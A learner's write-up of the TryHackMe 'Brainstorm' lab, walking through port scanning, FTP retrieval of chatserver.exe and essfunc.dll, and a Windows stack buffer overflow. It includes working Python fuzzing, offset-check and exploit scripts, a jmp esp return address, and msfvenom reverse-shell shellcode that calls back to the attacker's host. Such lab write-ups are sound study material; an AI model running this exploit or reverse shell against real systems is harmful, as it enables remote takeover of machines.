### Try Hack Me's Brainstorm room notes

This was one of my first buffer overflow rooms, so it took me longer than expected but it was certainly fun!

**Tools used**
+ nmap
+ lftp
+ ropper
+ pwntools
+ ghidra
+ Python
+ Jupyter notebook
+ x32dbg (from x64dbg)
+ Windows VM for running the program (or using Wine, whatever your preference)
+ Attacker VM through THM or your own


1. Port scanning revealed FTP running on port 21 and this 'Brainstorm chat' running on 9999
  
    <img width="821" height="504" alt="image" src="https://github.com/user-attachments/assets/4bb4cada-bae1-42f6-a976-da1fb3ba90ad" />

<br>     
<br> 
<br>
  
2. First, I ran into issues connecting to this FTP port in the normal 'ftp' command way, but somehow using 'lftp' worked in this case. Passive mode had to be set to off before I could use any commands or find the files. This led to two files: chatserver.exe and essfunc.dll
  
    <img width="802" height="464" alt="image" src="https://github.com/user-attachments/assets/e57a03d2-b5e2-41f6-b8f9-6708670e506a" />

<br>     
<br> 
<br>
  
3. Further analysis revealed that chatserver.exe relies on essfunc.dll, so I can look into the DLL file to see what's in there with ghidra. I found both a strcpy() function taking 2 arguments and a memcpy() function in the Functions list. strcpy() seemed relevant in this case.
    <img width="1110" height="619" alt="image" src="https://github.com/user-attachments/assets/6c796051-9f1b-41b2-a76f-a120ef896cf0" />

<br>     
<br> 
<br>
  
4. To keep it short, through some weird trial and error and many fumbles, I ended up discovering 'ropper' which helped me search the essfunc.dll file to find an instruction that can be exploited: jmp esp. I used 'pwntools' checksec function to see if there was anything to note there, and there was nothing.
  
<img width="540" height="156" alt="image" src="https://github.com/user-attachments/assets/85472fd2-bd72-4d5e-8244-4468d5b986b5" />

<br> 
  
<img width="361" height="38" alt="image" src="https://github.com/user-attachments/assets/729e6837-228f-4d71-893d-72091d81e246" />

<br>     
<br> 
<br>     
<br> 

5. From here, I used Windows to run the .exe file and analyze the DLL with x32dbg (which comes with x64dbg). I read some things about a very old program called immunity debugger, but opted for this option since it was quick install and I had no issues getting it to work right away. With the chat server running in Windows, I sent a Python fuzzing script to see what it would do. A thing to note is to make sure if the program sends a banner, to include socket.recv to catch it (and any subsequent) before sending a payload.

```python
import socket
from pwn import cyclic

TARGET_IP = "XXX.XXX.XX.X"  # Replace with VM IP if sending from host
TARGET_PORT = 9999 # port of running program

pattern = cyclic(2200)
print(pattern)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5.0)


try:
   s.connect((TARGET_IP, TARGET_PORT))
   s.recv(1024)                 # Read banner
   s.sendall(b"testuser\r\n")   # Send username
   s.recv(1024)                 # Read message prompt
   s.sendall(pattern + b"\r\n") # Send cyclic overflow
   print("[+] Pattern sent successfully.")
except Exception as e:
   print(f"[-] Error: {e}")
finally:
   s.close()
```

Program output:

Note: (1) this was a later iteration where I tried to add calc offset inside the same code, and (2) it gave me the wrong offset because I was not using Little Endian but rather Big Endian when I put the cyclic value returned from EIP.
<br> 

   <img width="502" height="163" alt="image" src="https://github.com/user-attachments/assets/514b12ff-0c74-462b-a4cb-fc525c5978fa" />

<br>     
<br> 

x32dbg output:
<br> 
   <img width="598" height="181" alt="image" src="https://github.com/user-attachments/assets/47e3782a-9cda-4d5d-af0e-bbdbba797e9e" />

<br>     
<br> 
I like Jupyter notebooks for storing notes, and running code snippet so ended up using that also to see where I went wrong with the offset value:
<br> 
   <img width="644" height="453" alt="image" src="https://github.com/user-attachments/assets/45a8cc49-629e-402a-91bb-7d33da4efd52" />

<br>     
<br>  
<br>
    
6. Next to ensure that I had the right offset, I created another test script to see if I landed in the right spot with "BBBB" in EIP:
  

```python
1 import socket
2
3
4 TARGET_IP = "192.168."  # Or your VM IP
5 TARGET_PORT = 9999
6
7 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
8 s.settimeout(5.0)
9
10 OFFSET = 2012
11
12 buffer = b"A" * OFFSET
13 eip = b"B" * 4
14 payload = buffer + eip
15
16
17
18
19 try:
20     s.connect((TARGET_IP, TARGET_PORT))
21     s.recv(1024)                 # Read banner
22     s.sendall(b"testuser\r\n")   # Send username
23     s.recv(1024)                 # Read message prompt
24     s.sendall(payload + b"\r\n") # Send payload verification (B should in EIP)
25     print("[+] Payload sent successfully.")
26 except Exception as e:
27     print(f"[-] Error: {e}")
28 finally:
29     s.close()
```

  
x32dbg output:
<br> 
<img width="688" height="158" alt="image" src="https://github.com/user-attachments/assets/3c2b8faa-e383-404f-bef2-8b6893c8b496" />
    
<br>     
<br> 
<br>
    
7. Next I created the shellcode with msfvenom, and went back to the THM machine to execute the payload.
  
```python
import socket
from struct import pack

TARGET_IP = "10.66.144.42"  # Or your VM IP
TARGET_PORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5.0)


# msfvenom -p 'windows/shell_reverse_tcp' LHOST=$(vpnip) LPORT=443 -f 'python' --bad-chars="\x00" --var-name shellcode

shellcode =  b""
shellcode += b"\xbd\x02\xac\x2a\x71\xda\xdf\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x52\x31\x6e\x12\x03\x6e\x12"
shellcode += b"\x83\xc4\xa8\xc8\x84\x34\x58\x8e\x67\xc4\x99"
shellcode += b"\xef\xee\x21\xa8\x2f\x94\x22\x9b\x9f\xde\x66"
shellcode += b"\x10\x6b\xb2\x92\xa3\x19\x1b\x95\x04\x97\x7d"
shellcode += b"\x98\x95\x84\xbe\xbb\x15\xd7\x92\x1b\x27\x18"
shellcode += b"\xe7\x5a\x60\x45\x0a\x0e\x39\x01\xb9\xbe\x4e"
shellcode += b"\x5f\x02\x35\x1c\x71\x02\xaa\xd5\x70\x23\x7d"
...


OFFSET = 2012
69 buffer=b"A" * OFFSET
70 eip = pack("<L", 0x625014DF) #jmp_esp from ropper
71 nop = b"\x90" * 32
72 payload = buffer + eip + nop + shellcode


try:
    s.connect((TARGET_IP, TARGET_PORT))
    s.recv(1024)                 # Read banner
    s.sendall(b"testuser\r\n")   # Send username
    s.recv(1024)                 # Read message prompt
    s.sendall(payload + b"\r\n") # Send payload 
    print("[+] Payload sent successfully.")
except Exception as e:
    print(f"[-] Error: {e}")
finally:
    s.close()

```
<br>

8. And here we have root:
  
    <img width="516" height="366" alt="image" src="https://github.com/user-attachments/assets/e7c269ba-9e73-4ff4-a449-18a8762f9003" />


